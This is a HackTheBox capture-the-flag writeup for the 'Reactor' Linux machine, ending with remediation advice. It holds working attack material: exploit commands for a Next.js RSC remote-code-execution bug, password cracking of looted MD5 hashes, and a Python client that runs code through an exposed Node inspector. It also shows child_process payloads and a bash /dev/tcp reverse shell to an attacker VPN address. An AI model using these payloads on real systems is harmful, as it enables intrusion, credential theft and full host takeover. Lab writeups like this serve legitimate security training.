---
layout: default
title: Reactor
parent: HTB Writeups
nav_order: 1
---

# HTB Reactor — Full Writeup

**Machine:** Reactor (Linux) · **Difficulty:** Medium · **Attack Surface:** 2 ports — 22 (SSH), 3000 (HTTP)

---

## 1. Recon & Fingerprinting

Nmap surfaced only SSH and a web service on 3000. The root page is a fake nuclear monitoring dashboard — **"REACTORWATCH — Core Monitoring System v3.2.1"** — built on **Next.js 15.0.3 (App Router)**.

Fingerprinting came straight from the page source: `self.__next_f.push(...)` blocks — RSC Flight payloads serializing the entire dashboard (metrics, logs, personnel). No credentials in it, but it confirmed the stack and gave up the build ID.

Wordlist fuzzing of `/_next/static/` (feroxbuster) confirmed the standard webpack chunks; nothing hidden beyond the obvious app.

---

## 2. Initial Foothold — React2Shell (CVE-2025-55182)

Next.js **15.0.3** sits in the vulnerable range for **React2Shell** — the pre-auth RCE in the React Flight decoder (prototype pollution via crafted `then`/`__proto__` keys in Server Action payloads → arbitrary module load → `child_process` execution). Affected: Next.js 15.0.x–16.0.x running React 19 with RSC; fixed in 15.0.5+.

A public PoC (`exploit-redirect.sh`) was used with **HTTP 303 redirect exfiltration** — command output rides back in the `Location` header, which sidesteps blind-RCE pain entirely.

```bash
./exploit-redirect.sh http://10.129.154.181:3000/ "id"
./exploit-redirect.sh http://10.129.154.181:3000/ "ls -la /opt/reactor-app"
```

**Shell as the Node app user.** Confirmed files: `app/`, `next.config.js`, `package.json`, `reactor.db`, `.env`.

---

## 3. Loot — `.env` & Database

### `.env`

| Key | Value |
|-----|-------|
| `DB_PATH` | `/opt/reactor-app/reactor.db` |
| `DB_TYPE` | `sqlite3` |
| `SENSOR_API_KEY` | `rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k` |
| `ALERT_WEBHOOK` | `https://alerts.internal.reactor.htb/webhook` *(red herring)* |
| `NODE_ENV` | `production` |

### `reactor.db` (SQLite) — `users` table

| id  | username | password_hash (MD5)                | role          |
| --- | -------- | ---------------------------------- | ------------- |
| 1   | admin    | `a203b22191d7xxxxxxxxxa5c101b17b8` | administrator |
| 2   | engineer | `39d97110eafexxxxxxxxx812cd271e8e` | operator      |

Cracked with **John the Ripper**:

```bash
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show --format=Raw-MD5 hashes.txt
```

`admin`'s hash never fell. `engineer`'s did — and worked over **SSH → shell as `engineer`**. (Admin's password, wherever it lives, wasn't needed.)

---

## 4. Privesc Triage — Distinguishing Signal from Noise

Engineer enumeration produced several red herrings:

| Finding                                                       | Verdict                                                                                                           |
| ------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------- |
| `lxd` group membership + writable `/run/lxd-installer.socket` | **Decoy** — LXD not installed; snap install requires internet (blocked). `lxc version` just errored via the shim. |
| `/etc/crontab`, systemd timers                                | All stock Ubuntu — nothing planted                                                                                |
| `ALERT_WEBHOOK` internal hostname                             | Not in `/etc/hosts`, never resolvable — flavor text                                                               |

**The real signal** in `ss -tlnp`:

```
LISTEN  127.0.0.1:9229   ← Node.js V8 Inspector (--inspect)
```

Loopback-only, and `ss` shows no owning process (different user's proc) — a debug port left open on a *separate, more privileged* Node process.

---

## 5. Root — Node.js Inspector RCE via SSH Tunnel

### Summary

A Node.js process runs with the inspector enabled on `127.0.0.1:9229` (loopback only). The Chrome DevTools Protocol (CDP) spoken over that port allows `Runtime.evaluate` — arbitrary JavaScript execution inside the running process — which trivially becomes command execution as the process owner. Access requires an SSH local port forward from an authenticated session as `engineer`.

### 5.1 Tunnel the inspector port

```bash
ssh -N -L 9229:127.0.0.1:9229 engineer@10.129.154.181
```

- `-N` = no shell, no command — the session sits there silently **by design**. It's not hanging; it's holding the tunnel open. Use a second terminal for everything else.
- Verify the tunnel: `curl http://127.0.0.1:9229/json`
- To add a forward to an existing session: **Enter**, then `~C` (escape sequence only works at a fresh line start), then `-L 9229:127.0.0.1:9229`.

### 5.2 Discover the debugger endpoint

```bash
curl -s http://127.0.0.1:9229/json | jq -r '.[0].webSocketDebuggerUrl'
# ws://127.0.0.1:9229/55f079fd-0d26-4eb1-974b-6126050222b2
```

The `/json` endpoint also reveals the app `title` and script `url` — note the path for source review later.

### 5.3 Attach over WebSocket (CDP)

`websocat` isn't packaged for Debian. Equivalent options:

| Tool | Install |
|---|---|
| `python3-websocket` | `sudo apt install python3-websocket` |
| `wscat` | `npx wscat -c <url>` (needs npm) |
| `websocat` static binary | GitHub releases (musl build) |
| Chromium GUI | `chrome://inspect` → Configure → `127.0.0.1:9229` |

**Python REPL** — auto-fetches the UUID, handles `awaitPromise` and error display:

```python
#!/usr/bin/env python3
# cdp.py — attach to Node inspector and evaluate JS
import json, urllib.request
from websocket import create_connection

disc = json.load(urllib.request.urlopen("http://127.0.0.1:9229/json"))
ws = create_connection(disc[0]["webSocketDebuggerUrl"])
print(f"[+] attached: {disc[0].get('title','?')} | {disc[0].get('url','?')}")
i = 0
while True:
    expr = input("node> ").strip()
    if not expr: continue
    i += 1
    ws.send(json.dumps({"id": i, "method": "Runtime.evaluate",
        "params": {"expression": expr, "returnByValue": True, "awaitPromise": True}}))
    while True:
        r = json.loads(ws.recv())
        if r.get("id") == i: break
    res = r["result"]
    if "exceptionDetails" in res:
        print("ERR:", res["exceptionDetails"].get("exception", {}).get("description", "")[:400])
    else:
        print(res["result"].get("value"))
```

Raw websocket workflow (wscat/websocat): each line is one CDP message.

Sanity check:
```json
{"id":1,"method":"Runtime.evaluate","params":{"expression":"1+1","returnByValue":true}}
```

**RCE:**

```json
{"id":2,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('id; hostname').toString()","returnByValue":true}}
```

Output lands in `.result.result.value`.

ESM fallback (no `mainModule`): `import('child_process').then(cp=>cp.execSync('id').toString())` — works because `awaitPromise:true`.

### 5.4 Post-exploitation checklist

```js
process.mainModule.require('child_process').execSync('id').toString()      // whoami
process.mainModule.require('child_process').execSync('sudo -l').toString() // privesc paths
process.env                                                                // secrets/creds
process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()
```

- Check the process user (`ps aux | grep node`) — RCE runs as whoever owns Node, which may not be `engineer`
- Review app source at the `url` from `/json` for hardcoded creds
- Enumerate loopback-only services reachable from the Node host

Or upgrade to a full TTY reverse shell from the console:
```js
process.mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/<VPN_IP>/4444 0>&1"')
```

### 5.5 Gotchas encountered

- **"SSH hangs"** → `-N` behavior, not a bug; no prompt will ever appear
- **`~C` printed literally** → must be first chars on a fresh line (Enter first)
- **Truncated UUID** → terminal line-wrap; the WS path is a full 36-char UUID, copy via `jq`, not by eye
- **UUID rotates** on every app restart → re-fetch `/json`
- **Connects but no reply** → started with `--inspect-brk`; send `{"id":0,"method":"Debugger.resume"}` first
- **Immediate rejection** → Node allows one debugger client; kill other attached sessions
- **`curl --ws` useless here** → Debian builds curl without WebSocket support

---

## 6. Attack Chain Summary

```
nmap: 22 + 3000
   └─ Next.js 15.0.3 (App Router, RSC/webpack)
        └─ CVE-2025-55182 (React2Shell) — pre-auth RCE via Flight decoder
             └─ RCE as node app user (redirect-exfil PoC)
                  ├─ .env        → SENSOR_API_KEY, ALERT_WEBHOOK (red herrings)
                  └─ reactor.db  → MD5 hashes
                       └─ john (Raw-MD5 + rockyou) → engineer's password
                            └─ SSH as engineer
                                 └─ ss -tlnp → 127.0.0.1:9229 (Node --inspect)
                                      └─ SSH tunnel → CDP Runtime.evaluate
                                           └─ root → root.txt
```

---

## 7. Remediation (for the report)

1. **Upgrade Next.js** past 15.0.5 (ideally latest 15.x/16.x) — CVE-2025-55182 is network-exploitable pre-auth with CVSS 10.0.
2. **Never run Node with `--inspect` in production** — or bind it to a socket that isn't reachable from other service accounts. This was the entire privesc.
3. **Stop using unsalted MD5 for credentials** — cracked in seconds against rockyou.
4. **Rotate `SENSOR_API_KEY`** — it was exposed in `.env` alongside a reachable RCE; treat it as compromised.
5. **Don't leave group-membership escape hatches** (`lxd` group with no LXD installed) — not exploitable here, but a standing risk.

---

*Flags obtained: user.txt (engineer), root.txt (root via Node inspector). All actions performed on an authorized HackTheBox machine.*